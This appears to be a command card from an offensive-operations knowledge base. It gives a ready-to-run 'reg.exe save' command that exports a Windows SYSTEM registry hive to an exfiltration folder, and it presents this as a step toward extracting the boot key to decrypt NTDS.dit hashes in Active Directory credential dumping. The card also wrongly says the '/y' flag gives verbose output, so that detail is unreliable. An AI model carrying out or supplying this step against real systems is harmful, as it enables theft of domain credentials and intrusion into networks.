---
type: command
executor: cmd
data: reg.exe save hklm\system $_EXFIL_PATH\system.bak
output: null
platforms:
  - Windows
tags:
  - registry
  - backup
  - ad
verified: true
validated: true
---

# reg-save-system-hive-to-exfil

## Command

```cmd
reg.exe save hklm\system $_EXFIL_PATH\system.bak
```

## Description

Exports the SYSTEM registry hive (HKEY_LOCAL_MACHINE\SYSTEM) to a backup file, which contains the boot key required for decrypting NTDS.dit hashes in Active Directory credential dumping workflows.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hklm\system | The registry key path for the SYSTEM hive | Built-in |
| $_EXFIL_PATH | Path to the exfiltration directory (e.g., C:\exfil) | Yes |
| system.bak | Output filename for the hive backup | Built-in |
| save | Operation to save the specified key to file | Built-in |

## Examples

### Basic Usage

```cmd
reg.exe save hklm\system C:\exfil\system.bak
```

### Advanced Usage

Save with verbose output:

```cmd
reg.exe save hklm\system C:\backup\system.hiv /y
```

## Expected Output

The operation completed successfully.

Success: File created at specified path with size > 10MB (typical for SYSTEM hive).

## Related

- [[procedures/Dump-AD-Domain-Credentials-with-DiskShadow]]
